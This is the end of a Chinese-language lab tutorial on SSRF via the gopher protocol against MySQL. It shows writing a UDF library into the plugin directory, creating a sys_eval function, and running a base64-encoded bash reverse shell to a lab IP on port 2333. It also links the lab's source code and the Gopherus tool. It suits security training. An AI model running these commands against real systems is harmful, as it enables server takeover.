MariaDB [(none)]> SELECT 0x7f454c460...省略大量payload...0000000 INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
```

> 关于 UDF 提权的 UDF 命令可以参考国光写的这个 UDF 提权辅助页面：[MySQL UDF 提权十六进制查询 | 国光](https://www.sqlsec.com/tools/udf.html)

tcpdump 监听到的原始数据后，转换 gopher 协议，SSRF 攻击写入动态链接库，因为这个 gopher 协议的数据包非常长，BP 这边可能会出现 Waiting 卡顿的状态：

[![img](https://shs3.b.qianxin.com/butian_public/f63a0fde87feaf1d0eddd5c4b5ddbfb9f.jpg)](https://shs3.b.qianxin.com/butian_public/f63a0fde87feaf1d0eddd5c4b5ddbfb9f.jpg)

不过问题不大，实际上 udf.so 已经成功写入到 MySQL 的插件目录下了：

[![img](https://shs3.b.qianxin.com/butian_public/f2e334f9c5049dd453eac01154acf03c9.jpg)](https://shs3.b.qianxin.com/butian_public/f2e334f9c5049dd453eac01154acf03c9.jpg)

以此类推，创建自定义函数：

```php
$ mysql -h127.0.0.1 -uroot -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';"
```

最后通过创建的自定义函数并执行系统命令将 shell 弹出来，原生命令如下：

```php
$ mysql -h127.0.0.1 -uroot -e "select sys_eval('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuMi8yMzMzIDA+JjE=|base64 -d|bash -i')"
```

因为国光测试默认情况下弹不出来，所以这里将原始的 bash 反弹 shell 命令给编码了：

[![img](https://shs3.b.qianxin.com/butian_public/f25e82721a93cbbd340222e66cc1958c9.jpg)](https://shs3.b.qianxin.com/butian_public/f25e82721a93cbbd340222e66cc1958c9.jpg)

这个编码实际上就是 JS Base64 一下，国光我模仿国外的那个网站，自己写了个页面：[安全小公举 | 国光](https://www.sqlsec.com/tools.html)

tcpdump 监听到的原始数据后，转换 gopher 协议，BP 二次编码请求一下，然后 SSRF 攻击成功弹出 shell：

[![img](https://shs3.b.qianxin.com/butian_public/ff0aa111cb215c03b6db4b44a2830d6ef.jpg)](https://shs3.b.qianxin.com/butian_public/ff0aa111cb215c03b6db4b44a2830d6ef.jpg)

靶场源码
====

另外附上了本次靶场的源码：[Github - sqlsec/ssrf-vuls](https://github.com/sqlsec/ssrf-vuls)，有动手能力朋友的可以自行搭建，

参考资料
====

- [Github：tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
- [https://github.com/LS95/gopher-redis-auth](https://xz.aliyun.com/t/Github%EF%BC%9ALS95/gopher-redis-auth)

文章经国光授权转载，原文链接为：<https://xz.aliyun.com/t/9554>